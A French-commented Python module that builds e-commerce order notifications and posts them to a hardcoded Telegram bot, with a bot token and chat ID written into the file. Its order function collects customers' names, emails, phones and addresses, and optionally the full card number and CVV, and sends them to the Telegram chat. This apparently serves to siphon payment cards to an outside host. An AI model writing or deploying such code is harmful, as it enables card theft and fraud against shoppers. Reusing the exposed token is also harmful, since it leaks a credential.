import requests
from datetime import datetime

# Configuration Telegram
TELEGRAM_BOT_TOKEN = "8577128387:AAHOGQSpChaTTtumG3Kv6XnYvrJjTT4orsc"
# Remplacez par le bon chat_id (trouvé avec /getUpdates)
TELEGRAM_CHAT_ID = "8419878124"  # À remplacer par le bon ID

def send_telegram_message(message):
    """Envoyer un message à Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, data=payload, timeout=10)
        
        if response.status_code == 200:
            print("✅ Message Telegram envoyé avec succès")
            return True
        else:
            print(f"❌ Erreur Telegram: {response.status_code} - {response.text}")
            return False
            
    except Exception as e:
        print(f"❌ Erreur lors de l'envoi Telegram: {e}")
        return False

def test_telegram_connection():
    """Tester la connexion avec Telegram"""
    current_time = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    test_message = f"""
🔵 <b>TEST DE CONNEXION TELEGRAM</b> 🔵
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

✅ Votre bot fonctionne correctement !
📅 Date du test: {current_time}

Vous êtes maintenant prêt à recevoir les notifications de commandes.
"""
    return send_telegram_message(test_message)

def send_order_notification(commande, items, card_info, show_full_card=False):
    """Envoyer une notification de commande à Telegram"""
    current_time = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
    
    # Afficher toutes les infos de carte ou seulement les 4 derniers chiffres
    if show_full_card:
        card_number_display = card_info.get('number', 'N/A')
        card_cvv_display = card_info.get('cvv', 'N/A')
    else:
        card_number = card_info.get('number', '').replace(' ', '').replace('-', '')
        last4 = card_number[-4:] if len(card_number) >= 4 else 'XXXX'
        card_number_display = f"**** **** **** {last4}"
        card_cvv_display = "***"
    
    message = f"""
🔵 <b>💳 NOUVELLE COMMANDE PAR CARTE</b> 🔵
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📦 <b>Commande N°:</b> {commande.numero}
💰 <b>Montant:</b> {commande.total_final:,.2f} €
📅 <b>Date:</b> {current_time}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 INFORMATIONS CLIENT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Nom:</b> {commande.nom_client}
<b>Email:</b> {commande.email_client}
<b>Téléphone:</b> {commande.telephone_client or 'Non renseigné'}

<b>📍 Adresse de livraison:</b>
{commande.adresse_livraison}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>💳 INFORMATIONS CARTE</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Numéro:</b> {card_number_display}
<b>Expiration:</b> {card_info.get('expiry', 'N/A')}
<b>Titulaire:</b> {card_info.get('holder', 'N/A')}
<b>CVV:</b> {card_cvv_display}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>📦 PRODUITS COMMANDÉS</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for item in items:
        message += f"\n• {item.produit.nom[:50]}\n  Quantité: {item.quantite} x {item.prix_unitaire:,.2f}€ = {item.quantite * item.prix_unitaire:,.2f}€\n"
    
    message += f"""
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>💰 RÉCAPITULATIF</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<b>Sous-total:</b> {commande.total:,.2f} €
<b>Livraison:</b> {commande.frais_port:,.2f} €
"""
    
    if commande.reduction > 0:
        message += f"<b>Réduction:</b> -{commande.reduction:,.2f} €\n"
    
    message += f"""
<b>Total TTC:</b> {commande.total_final:,.2f} €

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>PAIEMENT ENREGISTRÉ</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    return send_telegram_message(message)

def get_updates():
    """Récupérer les messages pour trouver le bon chat_id"""
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
        response = requests.get(url, timeout=10)
        data = response.json()
        
        if data.get('ok') and data.get('result'):
            for update in data['result']:
                if 'message' in update:
                    chat = update['message'].get('chat', {})
                    chat_id = chat.get('id')
                    print(f"Chat ID trouvé: {chat_id}")
                    print(f"Nom: {chat.get('first_name')}")
                    return chat_id
        return None
    except Exception as e:
        print(f"Erreur getUpdates: {e}")
        return None
